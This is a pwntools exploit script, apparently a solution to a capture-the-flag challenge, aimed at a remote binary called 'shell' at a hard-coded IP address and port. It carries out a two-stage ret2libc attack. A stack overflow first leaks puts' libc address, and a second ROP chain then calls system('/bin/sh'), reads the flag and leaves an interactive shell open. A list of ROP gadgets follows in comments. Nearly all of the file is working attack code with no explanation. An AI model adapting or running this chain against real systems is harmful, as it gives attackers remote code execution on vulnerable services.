from pwn import *
context(log_level='debug',arch='amd64',os='linux',terminal=['tmux','splitw','-h'])


# io=process("./shell")
io=remote("43.143.7.97",28569)
elf=ELF("./shell")
libc=ELF("./libc.so")
pop_rdi_ret=0x401d13
puts_plt=elf.plt[b"puts"]
puts_got=elf.got[b"puts"]
vuln=0x401c34
ret=0x40101a

io.recvuntil(b"[haha]$")
io.sendline(b"> {")
io.recvuntil(b"name:")
payload=cyclic(0x68)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(vuln)
io.sendline(payload)
leak_addr=u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))-libc.sym[b"puts"]
print("leak_addr:  "+hex(leak_addr))

sys_addr=leak_addr+libc.sym[b"system"]
str_bin_sh=leak_addr+next(libc.search(b"/bin/sh"))

# gdb.attach(io)
# pause()

io.recvuntil(b"[haha]$")
io.sendline(b"> {")
io.recvuntil(b"name:")
payload=cyclic(0x68)+p64(ret)+p64(pop_rdi_ret)+p64(str_bin_sh)+p64(sys_addr)
io.sendline(payload)
io.sendline(b"cat flag")
# print("a:  "+hex(str_bin_sh))
# print("b:  "+hex(sys_addr))
io.interactive()



# Gadgets information
# ============================================================
# 0x0000000000401d0c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401d0e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401d10 : pop r14 ; pop r15 ; ret
# 0x0000000000401d12 : pop r15 ; ret
# 0x0000000000401d0b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401d0f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000040141d : pop rbp ; ret
# 0x0000000000401a77 : pop rbx ; pop rbp ; ret
# 0x0000000000401d13 : pop rdi ; ret
# 0x0000000000401d11 : pop rsi ; pop r15 ; ret
# 0x0000000000401d0d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret
# 0x0000000000401855 : ret 0x45c7
# 0x0000000000401593 : ret 0x8d48

# Unique gadgets found: 14
